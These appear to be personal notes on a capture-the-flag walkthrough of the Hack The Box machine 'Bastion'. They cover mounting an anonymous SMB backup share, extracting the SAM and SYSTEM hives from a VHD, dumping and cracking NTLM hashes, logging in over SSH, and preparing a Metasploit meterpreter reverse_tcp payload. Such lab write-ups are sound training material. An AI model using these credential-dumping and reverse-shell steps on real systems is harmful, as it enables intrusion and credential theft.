- We find a full windows directory backup of `L4mpje`user in `Backups`SMB share
- Cannot download it as the file is too big (5.4 GBs), so let's mount it using :
	- `sudo mkdir /mnt/Bastion`
	- `sudo mount -t cifs -o username=anonymous //10.10.10.134/Backups /mnt/Bastion/`
- Then we can `guestmount`the `9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd`file:
	- The **guestmount** program can be **used to mount virtual machine filesystems and other disk images on the host**
	- `sudo guestmount -a /mnt/Bastion/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd -i /mnt/vhd`

# Dumping the SAM and SYSTEM file
---
- Now we have full access to `C:\Windows\System32\config`, s**o we can copy `SYSTEM`and `SAM`file**
	- `cp C:\Windows\System32\config\SYSTEM .`
	- `cp C:\Windows\System32\config\SAM .`
- Then just **dump** the hashes using `secretsdump`**:
	- `impacket-secretsdump -sam SAM -system SYSTEM LOCAL`
	- ==Note :- We might also need the `SECURITY`file==
		- ![[Pasted image 20250421114659.png]]
- **Crack the NTLM hashes** using `hashcat`
	- ![[Pasted image 20250421114827.png]]
	- Note:- **Since Administrator never logged in, its password is empty**
	- `L4mpje`: `bureaulampje`
# Login using SSH
---
- We can login using ssh as `L4mpje`user:
	- `ssh L4mpje@10.10.10.134`
	- ![[Pasted image 20250421115011.png]]

# Get meterpreter shell
---
- Get meterpreter shell using `web_delivery`
	- `set payload windows/x64/meterpreter/reverse_tcp`
		- ![[Pasted image 20250421115817.png]]
	- ![[Pasted image 20250421115839.png]]
	